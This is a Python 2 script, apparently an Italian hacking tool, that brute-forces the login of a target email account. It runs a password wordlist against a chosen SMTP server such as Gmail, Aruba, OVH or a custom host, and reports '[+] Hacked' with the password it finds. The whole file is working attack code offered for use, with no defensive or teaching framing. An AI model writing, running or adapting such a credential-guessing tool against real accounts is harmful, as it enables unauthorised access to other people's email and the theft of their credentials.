#!/usr/bin/python
'''create by MAVERIKGOLD'''


''' da aggiungere future per creare custom attack ''' 
import smtplib
from os import system
from time import sleep
import time


def StartMessage():
    print '================================================='
    print '               create by MAVERIKGOLD             '
    print '================================================='
    print '\n                                               '
    print '                      V.1.0.0                    '


StartMessage()



def ChoiseSMTP():
    global semtp_custom_address
    global semtp_custom_port
    print 'Choise'
    print '[1] GMAIL https://www.google.com/intl/it/gmail/about/'
    print '[2] ARUBA https://www.aruba.it '
    print '[3] OVH'
    print '[4] Custom'
    option = input('==>')
    if option == 1:
        semtp_custom_address = 'smtps.gmail.com'
        semtp_custom_port = '465'
        print 'your choise is GMAIL, gmail decline login afther more attempt and notify the issue to the owner of the email.  SMTP:' ,semtp_custom_address, ' port : ' , semtp_custom_port


    if option == 2:
        print 'your choise is : ARUBA'
        semtp_custom_address = 'smtps.aruba.it'
        semtp_custom_port = '465'
        print 'your choise is : ARUBA SMTP', semtp_custom_address, ' port : ' , semtp_custom_port

    if option == 3:
        print 'your choise is : ARUBA'
        semtp_custom_address = 'SSL0.OVH.NET'
        semtp_custom_port = '465'
        print 'your choise is : ARUBA SMTP', semtp_custom_address, ' port : ' , semtp_custom_port

    if option == 4:
        print 'ENTER YOUR SERVER DETTAILS'
        semtp_custom_address = raw_input('enter smtp (example smtp.gmail.com) :')
        semtp_custom_port = raw_input('enter the port (example 465) :')
        print 'your choise is :CUSTOM SMTP', semtp_custom_address, ' port : ', semtp_custom_port





ChoiseSMTP()

def FilePath():
    global pass_list
    file_path = raw_input('path of passwords file :')
    pass_file = open(file_path, 'r')
    pass_list = pass_file.readlines()



FilePath()

def Dologin():
    i = 0
    a = 0

    print '\n'
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL(semtp_custom_address, int(semtp_custom_port))
    server.ehlo()
    for password in pass_list:

        i = i + 1
        a = a + 1
        if a == 2000:
           a = 0
           print'pausa tattica'
           time.sleep(1)
           server = smtplib.SMTP_SSL(semtp_custom_address, int(semtp_custom_port))
           server.ehlo()
        print str(i) + '/' + str(len(pass_list))

        try:
            password = password.lstrip()
            password = password.rstrip()

            server.login(user_name, password)
            system('clear')
            StartMessage()
            print '\n'
            print '[+] Hacked. Email:  '+user_name+'  password :' + password
            break

        except smtplib.SMTPAuthenticationError as e:
            error = str(e)
            if error[14] == '<':
                system('clear')
                StartMessage()
                print '[+] Hacked. Email:  '+user_name+'  password :' + password
                break

            else:
                print '[!] password not found => ' + password + str(e)



Dologin()
